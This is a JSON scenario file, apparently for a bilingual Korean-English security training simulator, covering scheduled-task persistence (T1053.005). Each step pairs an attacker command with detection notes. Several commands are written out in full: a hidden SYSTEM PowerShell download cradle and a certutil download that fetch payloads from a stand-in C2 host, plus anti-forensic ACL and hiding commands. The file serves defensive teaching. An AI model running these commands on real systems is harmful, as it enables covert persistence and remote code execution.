@@ -1,0 +1,248 @@
+{
+  "id": "T1053.005",
+  "title": "예약 작업 지속성 시뮬레이션",
+  "titleEn": "Scheduled Task Persistence Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 정찰", "labelEn": "🔍 Recon", "steps": [0] },
+    { "label": "⚡ 작업 생성", "labelEn": "⚡ Task Creation", "steps": [1, 2, 3, 4] },
+    { "label": "✅ 검증", "labelEn": "✅ Verification", "steps": [5] },
+    { "label": "🛡️ 보호 강화", "labelEn": "🛡️ Hardening", "steps": [6] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "x": 50, "y": 80 },
+    { "id": "victim", "label": "Victim PC\nDESKTOP-SEC01", "x": 230, "y": 80 },
+    { "id": "scheduler", "label": "Task Scheduler\nService", "x": 400, "y": 30 },
+    { "id": "c2", "label": "C2 Server\ncdn-static.corp.com", "x": 50, "y": 160 },
+    { "id": "tasks", "label": "4 Scheduled\nTasks", "x": 400, "y": 130 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "victim", "minStep": 0 },
+    { "from": "victim", "to": "scheduler", "minStep": 1 },
+    { "from": "scheduler", "to": "tasks", "minStep": 1 },
+    { "from": "tasks", "to": "c2", "minStep": 2 },
+    { "from": "victim", "to": "c2", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "Task Scheduler", "icon": "📅" },
+    { "name": "Event Viewer", "icon": "📋" },
+    { "name": "{companyName} Reports", "icon": "📊" },
+    { "name": "PowerShell", "icon": "🖥️" }
+  ],
+  "steps": [
+    {
+      "cmd": "schtasks /query /fo TABLE /nh | findstr /i \"update security\"",
+      "out": "GoogleUpdateTaskMachineCore       1/1/2024 6:00:00 AM     Ready\nGoogleUpdateTaskMachineUA         1/1/2024 7:05:00 AM     Ready\nMicrosoftEdgeUpdateTaskMachineCore  1/1/2024 6:30:00 AM   Ready\nSecurityHealthCheck               1/1/2024 12:00:00 AM   Disabled\nWindowsDefenderScheduledScan      Every Day               Ready\n\n[*] Existing scheduled tasks enumerated\n[*] Naming convention noted: [Vendor][Function]Task[Scope]\n[*] Good cover names: SecurityHealthCheck, WindowsUpdate variants",
+      "def": "[SIEM] Scheduled task enumeration detected - potential persistence reconnaissance",
+      "defAction": "Source: Command-line audit logging (Event ID 4688)\nTarget: schtasks.exe query\nAction: Enumeration activity logged, baseline comparison queued",
+      "desc": "기존 예약 작업을 조회하여 합법적인 작업과 혼합할 수 있는 이름과 패턴을 파악합니다.",
+      "descEn": "The attacker enumerates existing scheduled tasks to identify naming patterns for blending in.",
+      "stepTitle": "기존 예약 작업 열거 및 명명 패턴 분석",
+      "stepTitleEn": "Existing Scheduled Task Enumeration and Naming Pattern Analysis",
+      "feynman": "회사 게시판에 이미 붙어있는 공지들의 형식을 먼저 살펴보는 것과 같습니다. 'GoogleUpdate', 'SecurityHealth', 'WindowsDefender' 같은 이름 패턴을 파악하면, 비슷한 이름으로 악성 작업을 만들어도 목록에서 자연스럽게 섞여 들어갑니다.",
+      "feynmanEn": "It's like first studying the format of notices already posted on the company bulletin board. By understanding naming patterns like 'GoogleUpdate', 'SecurityHealth', and 'WindowsDefender', creating malicious tasks with similar names lets them blend naturally into the list.",
+      "expert": "예약 작업 열거는 지속성 전략의 첫 단계입니다. [Vendor][Function]Task[Scope] 명명 규칙을 분석하여 'SecurityUpdateCheck', 'SystemHealthMonitor' 같은 합법적으로 보이는 이름을 선택합니다. Disabled 상태인 SecurityHealthCheck는 재활성화하여 악용할 수도 있는 잠재적 벡터입니다.",
+      "expertEn": "Scheduled task enumeration is the first step in persistence strategy. By analyzing the [Vendor][Function]Task[Scope] naming convention, the attacker selects legitimate-looking names like 'SecurityUpdateCheck' and 'SystemHealthMonitor'. The disabled SecurityHealthCheck could also be reactivated and abused as a potential vector.",
+      "defTooltip": "🔐 예약 작업 열거 활동 감지! schtasks /query 명령으로 기존 작업 목록을 조회하고 있습니다.",
+      "defTooltipEn": "🔐 Scheduled task enumeration activity detected! Querying existing task list via schtasks /query.",
+      "hackerLog": {
+        "title": "schtasks_enum.txt",
+        "lines": [
+          { "log": "GoogleUpdateTaskMachineCore       1/1/2024 6:00:00 AM     Ready", "desc": "💡 Google 업데이트 작업의 명명 패턴 분석 - 유사한 이름으로 위장 가능" },
+          { "log": "SecurityHealthCheck               1/1/2024 12:00:00 AM   Disabled", "desc": "💡 비활성화된 보안 작업 발견 - 이 이름을 재활용하면 의심을 줄일 수 있음" },
+          { "log": "Naming convention noted: [Vendor][Function]Task[Scope]", "desc": "💡 명명 규칙 파악 완료 - 이 패턴에 맞는 이름으로 악성 작업 생성 예정" }
+        ]
+      },
+      "terms": [
+        { "name": "예약 작업 (Scheduled Task)", "desc": "Windows Task Scheduler에서 관리하는 자동 실행 작업. 시간, 이벤트, 부팅 등 다양한 트리거로 실행됩니다." },
+        { "name": "schtasks.exe", "desc": "예약 작업을 생성, 조회, 삭제하는 Windows 내장 명령줄 도구입니다." },
+        { "name": "Event ID 4688", "desc": "새 프로세스 생성 이벤트. schtasks.exe 실행과 그 명령줄 인수를 기록합니다." }
+      ]
+    },
+    {
+      "cmd": "schtasks /create /tn \"Microsoft\\Windows\\WindowsUpdate\\SecurityUpdateCheck\" /tr \"C:\\Users\\{userName}\\AppData\\Roaming\\Microsoft\\WindowsUpdate\\SecurityHealthService.exe\" /sc ONLOGON /rl HIGHEST /f",
+      "out": "SUCCESS: The scheduled task \"Microsoft\\Windows\\WindowsUpdate\\SecurityUpdateCheck\" has been successfully created.\n\n[*] Task details:\n    Name: SecurityUpdateCheck\n    Folder: \\Microsoft\\Windows\\WindowsUpdate\\\n    Trigger: On user logon\n    Run level: Highest available\n    Action: SecurityHealthService.exe (malicious payload)\n\n[*] Advantages:\n    - Nested in legitimate Windows Update folder\n    - Name mimics security update process\n    - HIGHEST run level = admin if available\n    - Triggers at every user logon",
+      "def": "[EDR] Scheduled task created in Windows system folder with suspicious binary path",
+      "defAction": "Source: Sysmon Event ID 1 + Task Scheduler Event ID 106\nTarget: SecurityUpdateCheck task\nAction: Task path validated - binary in AppData flagged as suspicious",
+      "desc": "Windows Update 폴더에 합법적인 이름의 예약 작업을 생성하여 로그인 시 악성코드를 실행합니다.",
+      "descEn": "The attacker creates a scheduled task with a legitimate-looking name in the Windows Update folder, triggering at login.",
+      "stepTitle": "로그온 트리거 예약 작업 생성 (Windows Update 위장)",
+      "stepTitleEn": "Logon-Triggered Task Creation (Windows Update Disguise)",
+      "feynman": "학교 시간표에 '체육' 시간을 몰래 추가하는데, 기존 시간표 형식과 글씨체를 완벽히 따라한 것과 같습니다. \\Microsoft\\Windows\\WindowsUpdate 폴더에 작업을 만들면 Windows의 정식 시스템 작업처럼 보이고, 'SecurityUpdateCheck'라는 이름도 보안 업데이트 확인처럼 들립니다.",
+      "feynmanEn": "It's like secretly adding a 'PE class' to the school schedule by perfectly copying the existing timetable format and handwriting. Creating a task in \\Microsoft\\Windows\\WindowsUpdate makes it look like an official Windows system task, and the name 'SecurityUpdateCheck' sounds like a security update process.",
+      "expert": "Windows Task Scheduler의 폴더 구조를 악용하여 \\Microsoft\\Windows\\WindowsUpdate 경로에 작업을 생성하면 합법적인 시스템 작업 사이에 숨깁니다. /rl HIGHEST 플래그는 가용한 최고 권한으로 실행을 요청하며, 사용자가 관리자 그룹에 속해 있으면 상승된 권한으로 실행됩니다.",
+      "expertEn": "By abusing Task Scheduler's folder structure and creating tasks under \\Microsoft\\Windows\\WindowsUpdate, it hides among legitimate system tasks. The /rl HIGHEST flag requests execution at the highest available privilege, running elevated if the user belongs to the administrators group.",
+      "defTooltip": "🔐 Windows 시스템 폴더에 예약 작업 생성 감지! 바이너리 경로가 AppData를 가리킵니다 - 정상 시스템 작업은 System32를 사용합니다.",
+      "defTooltipEn": "🔐 Scheduled task created in Windows system folder! Binary path points to AppData - legitimate system tasks use System32.",
+      "hackerLog": {
+        "title": "schtasks_create_logon.txt",
+        "lines": [
+          { "log": "Folder: \\Microsoft\\Windows\\WindowsUpdate\\", "desc": "💡 정상 Windows Update 폴더 구조 안에 위치 - Task Scheduler GUI에서 구분 어려움" },
+          { "log": "Trigger: On user logon", "desc": "💡 사용자 로그인마다 실행 - 재부팅 후에도 지속" },
+          { "log": "Run level: Highest available", "desc": "💡 가능한 최고 권한으로 실행 요청 - 관리자 계정이면 상승된 권한 획득" }
+        ]
+      },
+      "terms": [
+        { "name": "Task Scheduler Event ID 106", "desc": "새 예약 작업이 등록될 때 기록되는 이벤트. 작업 이름, 생성자, 트리거 정보를 포함합니다." },
+        { "name": "/rl HIGHEST", "desc": "schtasks의 실행 수준 옵션. 사용자에게 가용한 최고 권한으로 작업을 실행합니다." },
+        { "name": "ONLOGON 트리거", "desc": "사용자가 시스템에 로그인할 때 작업을 실행하는 트리거 유형. 재부팅 생존 지속성의 핵심입니다." }
+      ]
+    },
+    {
+      "cmd": "schtasks /create /tn \"SystemHealthMonitor\" /tr \"powershell.exe -ep bypass -w hidden -c \\\"IEX(IWR 'https://cdn-static.{companyName}-corp.com/health.ps1')\\\"\" /sc MINUTE /mo 30 /ru SYSTEM /f",
+      "out": "SUCCESS: The scheduled task \"SystemHealthMonitor\" has been successfully created.\n\n[*] Task details:\n    Name: SystemHealthMonitor\n    Trigger: Every 30 minutes\n    Run As: NT AUTHORITY\\SYSTEM\n    Action: PowerShell download cradle (hidden)\n\n[*] Capabilities:\n    - Runs as SYSTEM (highest privileges)\n    - Re-downloads payload every 30 min (resilient)\n    - If C2 changes, payload updates automatically\n    - PowerShell window hidden from user\n\n[*] WARNING: Requires admin privileges to create /ru SYSTEM",
+      "def": "[EDR] SYSTEM-level scheduled task created with PowerShell download cradle - CRITICAL",
+      "defAction": "Source: Task Scheduler audit (Event ID 4698)\nTarget: SystemHealthMonitor task\nAction: Task immediately disabled, PowerShell constrained language mode enforced",
+      "desc": "SYSTEM 권한으로 30분마다 실행되는 예약 작업을 생성하여 C2 연결을 유지합니다.",
+      "descEn": "The attacker creates a SYSTEM-level scheduled task executing every 30 minutes to maintain C2 connectivity.",
+      "stepTitle": "SYSTEM 권한 30분 주기 예약 작업 (다운로드 크래들)",
+      "stepTitleEn": "SYSTEM-Level 30-Minute Interval Task (Download Cradle)",
+      "feynman": "건물의 보안 시스템에 '30분마다 이 전화번호로 연락하라'는 규칙을 몰래 추가하는 것과 같습니다. 이 전화(다운로드 크래들)를 통해 공격자는 30분마다 새로운 지시사항(페이로드)을 전달할 수 있고, 전화번호(C2 주소)가 바뀌면 자동으로 업데이트됩니다.",
+      "feynmanEn": "It's like secretly adding a rule to the building's security system: 'call this number every 30 minutes.' Through this call (download cradle), the attacker can deliver new instructions (payload) every 30 minutes, and if the phone number (C2 address) changes, it auto-updates.",
+      "expert": "/ru SYSTEM 옵션은 NT AUTHORITY\\SYSTEM 컨텍스트에서 실행하므로 최고 권한을 가집니다. 30분 주기의 다운로드 크래들은 '파일리스' 접근 방식으로, 디스크에 페이로드를 저장하지 않고 매번 메모리에서 실행합니다. C2 URL이 변경되면 다음 주기에 자동으로 새 페이로드를 받습니다.",
+      "expertEn": "The /ru SYSTEM option runs in the NT AUTHORITY\\SYSTEM context with highest privileges. The 30-minute download cradle cycle is a 'fileless' approach that executes in memory each time without saving the payload to disk. If the C2 URL changes, new payloads are automatically fetched in the next cycle.",
+      "defTooltip": "🔐 SYSTEM 권한의 PowerShell 다운로드 크래들 예약 작업 생성! 30분마다 C2에서 코드를 받아 실행합니다.",
+      "defTooltipEn": "🔐 SYSTEM-level scheduled task with PowerShell download cradle created! Fetches and executes code from C2 every 30 minutes.",
+      "hackerLog": {
+        "title": "schtasks_system_30min.txt",
+        "lines": [
+          { "log": "Run As: NT AUTHORITY\\SYSTEM", "desc": "💡 최고 시스템 권한으로 실행 - 모든 파일, 레지스트리, 프로세스에 접근 가능" },
+          { "log": "Re-downloads payload every 30 min (resilient)", "desc": "💡 파일리스 실행 - 디스크에 페이로드를 남기지 않고 메모리에서만 동작" },
+          { "log": "If C2 changes, payload updates automatically", "desc": "💡 C2 인프라 교체에 자동 대응 - 방어자가 C2를 차단해도 새 주소로 자동 전환" }
+        ]
+      },
+      "terms": [
+        { "name": "NT AUTHORITY\\SYSTEM", "desc": "Windows에서 가장 높은 권한의 내장 계정. 관리자보다 높은 권한으로, 모든 시스템 리소스에 접근 가능합니다." },
+        { "name": "파일리스 실행 (Fileless Execution)", "desc": "디스크에 파일을 쓰지 않고 메모리에서만 코드를 실행하는 기법. 전통적인 AV의 파일 스캔을 우회합니다." },
+        { "name": "Event ID 4698", "desc": "예약 작업이 생성되었을 때 보안 로그에 기록되는 이벤트. 작업 XML 내용이 포함됩니다." }
+      ]
+    },
+    {
+      "cmd": "schtasks /create /tn \"NetworkDiagnostics\" /xml task_definition.xml /f",
+      "out": "SUCCESS: The scheduled task \"NetworkDiagnostics\" has been successfully created.\n\n[*] Task created from XML definition:\n\n  <Task>\n    <Triggers>\n      <EventTrigger>\n        <Subscription>\n          &lt;QueryList>&lt;Query>&lt;Select Path='Security'>*[System[EventID=4624]]&lt;/Select>&lt;/Query>&lt;/QueryList>\n        </Subscription>\n      </EventTrigger>\n    </Triggers>\n    <Actions>\n      <Exec>\n        <Command>cmd.exe</Command>\n        <Arguments>/c C:\\Windows\\Temp\\diag.bat</Arguments>\n      </Exec>\n    </Actions>\n    <Settings>\n      <Hidden>true</Hidden>\n    </Settings>\n  </Task>\n\n[*] Trigger: Windows Security Event ID 4624 (Successful Logon)\n[*] Hidden task (not visible in Task Scheduler GUI by default)",
+      "def": "[EDR] Hidden scheduled task created with event-based trigger on logon events",
+      "defAction": "Source: XML task definition analysis\nTarget: NetworkDiagnostics task\nAction: Hidden task discovered via PowerShell query, task deleted and XML preserved for forensics",
+      "desc": "XML로 이벤트 기반 트리거(로그온 이벤트)를 가진 숨겨진 예약 작업을 생성합니다.",
+      "descEn": "The attacker creates a hidden event-triggered scheduled task using XML that fires on logon events.",
+      "stepTitle": "이벤트 트리거 숨겨진 예약 작업 (XML 정의)",
+      "stepTitleEn": "Event-Triggered Hidden Task via XML Definition",
+      "feynman": "보이지 않는 잉크로 '누군가 건물에 들어올 때마다 이 작업을 실행하라'고 메모를 남기는 것과 같습니다. 이 예약 작업은 시간이 아닌 '이벤트'로 작동합니다. 누군가 로그인할 때마다(Event ID 4624) 자동으로 배치 파일을 실행하며, Hidden 설정으로 Task Scheduler에서도 보이지 않습니다.",
+      "feynmanEn": "It's like leaving a note in invisible ink saying 'execute this action whenever someone enters the building.' This scheduled task operates on 'events' rather than time. Whenever someone logs in (Event ID 4624), it automatically runs a batch file, and the Hidden setting makes it invisible even in Task Scheduler.",
+      "expert": "XML 기반 작업 정의는 GUI와 schtasks 명령줄보다 더 세밀한 제어를 가능하게 합니다. EventTrigger로 Security 로그의 Event ID 4624(성공적 로그온)를 구독하면, 시간 기반이 아닌 이벤트 기반 실행이 가능합니다. <Hidden>true</Hidden> 설정은 기본 Task Scheduler GUI에서 작업을 숨깁니다.",
+      "expertEn": "XML-based task definitions enable finer control than GUI or schtasks command line. Subscribing to Security log Event ID 4624 (Successful Logon) via EventTrigger enables event-based rather than time-based execution. The <Hidden>true</Hidden> setting hides the task from the default Task Scheduler GUI.",
+      "defTooltip": "🔐 이벤트 기반 트리거의 숨겨진 예약 작업 감지! Event ID 4624(로그온)마다 실행되며 GUI에서 보이지 않습니다.",
+      "defTooltipEn": "🔐 Hidden scheduled task with event-based trigger detected! Executes on every Event ID 4624 (logon) and invisible in GUI.",
+      "hackerLog": {
+        "title": "task_xml_definition.xml",
+        "lines": [
+          { "log": "*[System[EventID=4624]]", "desc": "💡 보안 로그의 로그온 성공 이벤트를 트리거로 사용 - 시간 기반보다 예측하기 어려움" },
+          { "log": "<Hidden>true</Hidden>", "desc": "💡 Task Scheduler GUI에서 기본적으로 보이지 않음 - 'Show Hidden Tasks' 설정 필요" },
+          { "log": "Arguments: /c C:\\Windows\\Temp\\diag.bat", "desc": "💡 Windows\\Temp에 있는 배치 파일 실행 - 스크립트 내용을 별도 분석해야 함" }
+        ]
+      },
+      "terms": [
+        { "name": "EventTrigger", "desc": "Windows 이벤트 로그의 특정 이벤트가 발생할 때 작업을 실행하는 트리거. WQL 쿼리 또는 XPath로 이벤트를 필터링합니다." },
+        { "name": "Event ID 4624", "desc": "Windows 보안 로그의 성공적 로그온 이벤트. 사용자, 서비스, 네트워크 로그온 등 모든 인증 성공을 기록합니다." },
+        { "name": "Hidden Task", "desc": "Task Scheduler의 XML 설정으로 GUI에서 숨길 수 있는 작업. PowerShell의 Get-ScheduledTask로는 여전히 조회 가능합니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -c \"$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c echo %USERNAME% %COMPUTERNAME% > C:\\Windows\\Temp\\beacon.txt && certutil -urlcache -split -f https://cdn-static.{companyName}-corp.com/update.exe C:\\Windows\\Temp\\update.exe'; $trigger = New-ScheduledTaskTrigger -AtStartup; $settings = New-ScheduledTaskSettingsSet -Hidden; Register-ScheduledTask -TaskName 'CertificateCheck' -Action $action -Trigger $trigger -Settings $settings -User 'SYSTEM' -RunLevel Highest\"",
+      "out": "TaskPath    TaskName          State\n--------    --------          -----\n\\           CertificateCheck  Ready\n\n[*] Task registered:\n    Name: CertificateCheck\n    Trigger: At system startup\n    Run As: SYSTEM\n    Hidden: Yes\n    Action: certutil download + execute\n\n[*] Using certutil as LOLBin (Living-off-the-Land Binary):\n    - Legitimate Windows tool for certificate management\n    - Built-in download capability (-urlcache)\n    - Often whitelisted by application control\n    - Less suspicious than PowerShell download",
+      "def": "[EDR] Certutil used as download LOLBin in scheduled task - Living-off-the-Land technique",
+      "defAction": "Source: LOLBin monitoring (certutil with -urlcache flag)\nTarget: CertificateCheck task\nAction: Certutil download blocked by AppLocker, task removed",
+      "desc": "certutil을 LOLBin으로 사용하는 시작 시 실행 예약 작업을 생성합니다.",
+      "descEn": "The attacker creates a startup-triggered task using certutil as a Living-off-the-Land Binary for downloading payloads.",
+      "stepTitle": "certutil LOLBin 다운로드 예약 작업 (부팅 트리거)",
+      "stepTitleEn": "Certutil LOLBin Download Task (Startup Trigger)",
+      "feynman": "회사의 인감 도장(certutil)을 원래 용도(인증서 관리)가 아닌 택배 수령(파일 다운로드)에 사용하는 것과 같습니다. certutil은 Windows에 기본으로 설치된 합법적인 도구이므로, 보안 소프트웨어가 이미 '안전하다'고 허용해둔 경우가 많습니다. 이것을 악용하면 별도의 도구 없이 파일을 다운로드할 수 있습니다.",
+      "feynmanEn": "It's like using the company's official seal (certutil) not for its intended purpose (certificate management) but for receiving packages (downloading files). Since certutil is a legitimate tool pre-installed on Windows, security software often has it already whitelisted as 'safe.' Abusing it enables file downloads without additional tools.",
+      "expert": "certutil -urlcache -split -f는 원래 인증서 관련 파일 다운로드용이지만, 임의의 파일을 다운로드하는 LOLBin으로 악용됩니다. 이 명령은 BITS나 PowerShell의 IWR보다 애플리케이션 제어 정책에서 허용될 가능성이 높습니다. 부팅 트리거와 결합하면 매 시작마다 C2에서 새 페이로드를 받습니다.",
+      "expertEn": "certutil -urlcache -split -f is originally for downloading certificate-related files but is abused as a LOLBin for arbitrary file downloads. This command is more likely to be allowed by application control policies than BITS or PowerShell's IWR. Combined with a startup trigger, it fetches new payloads from C2 at every boot.",
+      "defTooltip": "🔐 certutil이 LOLBin으로 사용됨! -urlcache 플래그와 함께 외부 URL에서 파일을 다운로드하는 예약 작업이 생성되었습니다.",
+      "defTooltipEn": "🔐 Certutil used as LOLBin! Scheduled task created to download files from external URL using -urlcache flag.",
+      "hackerLog": {
+        "title": "certutil_lolbin_task.txt",
+        "lines": [
+          { "log": "certutil -urlcache -split -f https://cdn-static.{companyName}-corp.com/update.exe", "desc": "💡 인증서 관리 도구를 파일 다운로더로 악용 - 앱 제어 정책 우회" },
+          { "log": "Trigger: At system startup", "desc": "💡 부팅마다 실행 - 시스템 시작 시 SYSTEM 권한으로 C2 페이로드 갱신" },
+          { "log": "Often whitelisted by application control", "desc": "💡 AppLocker/WDAC 허용 목록에 포함되어 있을 가능성 높음 - 추가 설정 없이 실행" }
+        ]
+      },
+      "terms": [
+        { "name": "LOLBin (Living-off-the-Land Binary)", "desc": "시스템에 기본 설치된 합법적 바이너리를 악용하는 기법. certutil, mshta, regsvr32 등이 대표적입니다." },
+        { "name": "certutil.exe", "desc": "Windows 인증서 관리 도구. -urlcache 플래그로 파일 다운로드가 가능하여 LOLBin으로 악용됩니다." },
+        { "name": "AppLocker", "desc": "Microsoft의 애플리케이션 제어 정책. 특정 실행 파일, 스크립트, DLL의 실행을 허용하거나 차단합니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -c \"$tasks = @('SecurityUpdateCheck','SystemHealthMonitor','NetworkDiagnostics','CertificateCheck'); foreach($t in $tasks) { $task = Get-ScheduledTask -TaskName $t; Write-Host $t': '$task.State' - Next: '$task.Triggers.StartBoundary }\"",
+      "out": "[*] Persistence verification - All scheduled tasks:\n\nSecurityUpdateCheck: Ready - Trigger: ONLOGON\n  → Binary persistence (AppData\\SecurityHealthService.exe)\n  → Runs as current user with highest privileges\n\nSystemHealthMonitor: Ready - Trigger: Every 30 minutes\n  → PowerShell download cradle (fileless)\n  → Runs as SYSTEM\n\nNetworkDiagnostics: Ready - Trigger: Event ID 4624\n  → Event-based (fires on any logon)\n  → Hidden from Task Scheduler GUI\n\nCertificateCheck: Ready - Trigger: At Startup\n  → LOLBin (certutil) download\n  → Runs as SYSTEM at boot\n\n[+] 4 persistence mechanisms active\n[+] Multiple trigger types ensure survival\n[+] Mix of fileless and file-based techniques",
+      "def": "[SIEM] Multiple malicious scheduled tasks correlated - comprehensive persistence campaign",
+      "defAction": "Source: SIEM correlation rule (4+ suspicious tasks)\nTarget: All malicious scheduled tasks\nAction: All tasks disabled and removed, comprehensive task audit across all endpoints initiated",
+      "desc": "생성한 모든 예약 작업의 상태를 확인하여 지속성 매커니즘이 완전히 구축되었는지 검증합니다.",
+      "descEn": "The attacker verifies all scheduled tasks are active, confirming comprehensive persistence is established.",
+      "stepTitle": "전체 예약 작업 상태 검증 (4중 지속성)",
+      "stepTitleEn": "Full Task Status Verification (Quadruple Persistence)",
+      "feynman": "건물에 4개의 비밀 출입구를 만들어놓고 모든 출입구가 잘 작동하는지 점검하는 것과 같습니다. 로그온할 때, 30분마다, 이벤트 발생할 때, 부팅할 때 - 네 가지 다른 조건으로 작동하므로 하나를 막아도 세 개가 남아 있습니다.",
+      "feynmanEn": "It's like creating 4 secret entrances to a building and checking that all entrances work properly. Triggered at logon, every 30 minutes, on events, and at boot — four different conditions mean even if one is blocked, three remain active.",
+      "expert": "4가지 지속성 메커니즘은 서로 다른 트리거 타입(로그온, 시간 간격, 이벤트, 부팅)과 실행 방식(바이너리, 파일리스, 이벤트 기반, LOLBin)을 조합합니다. SIEM의 상관 분석 규칙은 짧은 시간 내 여러 예약 작업 생성을 감지할 수 있지만, 각 작업이 며칠 간격으로 생성되면 탐지가 어려워집니다.",
+      "expertEn": "Four persistence mechanisms combine different trigger types (logon, interval, event, boot) with different execution methods (binary, fileless, event-based, LOLBin). SIEM correlation rules can detect multiple task creations within a short timeframe, but detection becomes difficult if each task is created days apart.",
+      "defTooltip": "🔐 4개의 악성 예약 작업이 동시에 활성 상태! 로그온/주기/이벤트/부팅 트리거를 조합한 포괄적 지속성 캠페인입니다.",
+      "defTooltipEn": "🔐 4 malicious scheduled tasks simultaneously active! Comprehensive persistence campaign combining logon/interval/event/boot triggers.",
+      "hackerLog": {
+        "title": "task_verification.txt",
+        "lines": [
+          { "log": "4 persistence mechanisms active", "desc": "💡 4중 지속성 - 하나가 제거되어도 3개의 백업이 남아 있는 다계층 방어" },
+          { "log": "Multiple trigger types ensure survival", "desc": "💡 로그온+30분+이벤트+부팅 = 거의 모든 상황에서 최소 하나 이상 실행" },
+          { "log": "Mix of fileless and file-based techniques", "desc": "💡 파일 기반+파일리스 혼합 - 단일 탐지 전략으로는 모두 차단 불가" }
+        ]
+      },
+      "terms": [
+        { "name": "다계층 지속성 (Multi-Layer Persistence)", "desc": "여러 기법과 트리거를 조합하여 방어자가 모든 지속성을 제거하기 어렵게 만드는 전략입니다." },
+        { "name": "SIEM 상관 분석 (SIEM Correlation)", "desc": "여러 보안 이벤트를 연결하여 개별 이벤트로는 탐지할 수 없는 공격 패턴을 식별하는 분석 기법입니다." },
+        { "name": "Get-ScheduledTask", "desc": "PowerShell cmdlet으로 예약 작업의 상세 정보를 조회합니다. Hidden 작업도 표시되어 schtasks보다 조사에 유용합니다." }
+      ]
+    },
+    {
+      "cmd": "icacls \"C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\WindowsUpdate\\SecurityUpdateCheck\" /deny Everyone:(F) && attrib +h +s \"C:\\Windows\\System32\\Tasks\\NetworkDiagnostics\"",
+      "out": "processed file: C:\\Windows\\System32\\Tasks\\...\\SecurityUpdateCheck\nSuccessfully processed 1 files; Failed processing 0 files\n\n[*] Anti-forensics applied:\n\n1. SecurityUpdateCheck:\n   - ACL: Deny Full Control to Everyone\n   - Cannot be read, modified, or deleted by standard tools\n   - Requires ownership change to remove\n\n2. NetworkDiagnostics:\n   - Attributes: Hidden + System\n   - Not visible in file explorer\n   - Not visible with standard dir command\n\n[*] Task files protected from easy removal\n[*] Persistence hardening complete",
+      "def": "[EDR] Task file permissions modified + hidden attribute set - anti-forensics techniques",
+      "defAction": "Source: File system integrity monitoring\nTarget: Scheduled task XML files\nAction: File permissions reset via SYSTEM context, hidden files revealed, all protections removed",
+      "desc": "예약 작업 파일의 ACL을 수정하고 숨김 속성을 적용하여 삭제와 분석을 어렵게 만듭니다.",
+      "descEn": "The attacker modifies task file ACLs and applies hidden attributes to make removal and analysis difficult.",
+      "stepTitle": "예약 작업 보호 강화 (ACL + 숨김 속성)",
+      "stepTitleEn": "Task Hardening (ACL + Hidden Attributes)",
+      "feynman": "비밀 문서를 금고에 넣고 금고 비밀번호를 바꿔서 아무도 열지 못하게 하고, 다른 문서는 투명 잉크로 안 보이게 만드는 것과 같습니다. 예약 작업 파일의 ACL을 'Everyone 거부'로 설정하면 아무도 읽거나 삭제할 수 없고, Hidden+System 속성은 파일 탐색기에서 완전히 숨깁니다.",
+      "feynmanEn": "It's like putting a secret document in a safe, changing the safe's password so nobody can open it, and making another document invisible with invisible ink. Setting the task file's ACL to 'Deny Everyone' prevents anyone from reading or deleting it, while Hidden+System attributes completely hide it from File Explorer.",
+      "expert": "icacls의 /deny Everyone:(F)는 Full Control을 모든 사용자에게 거부하므로, 심지어 Administrators 그룹도 직접 접근할 수 없습니다(Deny는 Allow보다 우선). 복구하려면 SYSTEM 컨텍스트에서 소유권을 먼저 변경해야 합니다. attrib +h +s는 파일을 Hidden+System으로 설정하여 일반 검색에서 숨깁니다.",
+      "expertEn": "icacls /deny Everyone:(F) denies Full Control to all users, so even the Administrators group cannot directly access the file (Deny overrides Allow). Recovery requires first changing ownership from a SYSTEM context. attrib +h +s sets files as Hidden+System, hiding them from standard searches.",
+      "defTooltip": "🔐 예약 작업 파일에 안티포렌식 보호 적용! Everyone에 대한 Full Control 거부와 Hidden+System 속성이 설정되었습니다.",
+      "defTooltipEn": "🔐 Anti-forensics protection applied to task files! Full Control denied for Everyone and Hidden+System attributes set.",
+      "hackerLog": {
+        "title": "task_hardening.txt",
+        "lines": [
+          { "log": "ACL: Deny Full Control to Everyone", "desc": "💡 모든 사용자에게 완전 접근 거부 - SYSTEM 컨텍스트로 소유권 변경 없이는 제거 불가" },
+          { "log": "Attributes: Hidden + System", "desc": "💡 파일 탐색기와 dir 명령에서 보이지 않음 - dir /a:hs로만 확인 가능" },
+          { "log": "Persistence hardening complete", "desc": "💡 4개 작업의 보호 강화 완료 - IR 팀의 제거 작업을 크게 지연시킴" }
+        ]
+      },
+      "terms": [
+        { "name": "icacls", "desc": "Windows의 파일/폴더 ACL을 관리하는 명령줄 도구. 권한 부여, 거부, 상속 설정 등이 가능합니다." },
+        { "name": "attrib", "desc": "파일 속성(읽기 전용, 숨김, 시스템, 보관)을 설정하거나 제거하는 Windows 명령줄 도구입니다." },
+        { "name": "파일 소유권 (File Ownership)", "desc": "파일에 대한 최종 제어 권한. ACL이 모든 접근을 거부해도 소유자는 ACL 자체를 변경할 수 있습니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "cmd.exe (attacker)", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "schtasks.exe /query (PID: 4001)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "schtasks.exe /create SecurityUpdateCheck (PID: 4101)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "schtasks.exe /create SystemHealthMonitor (PID: 4201)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "schtasks.exe /create NetworkDiagnostics (PID: 4301)", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "powershell.exe Register-ScheduledTask (PID: 4401)", "depth": 1, "alert": true, "minStep": 4 },
+    { "name": "icacls.exe (PID: 4601)", "depth": 1, "alert": true, "minStep": 6 },
+    { "name": "attrib.exe (PID: 4602)", "depth": 1, "alert": true, "minStep": 6 }
+  ]
+}
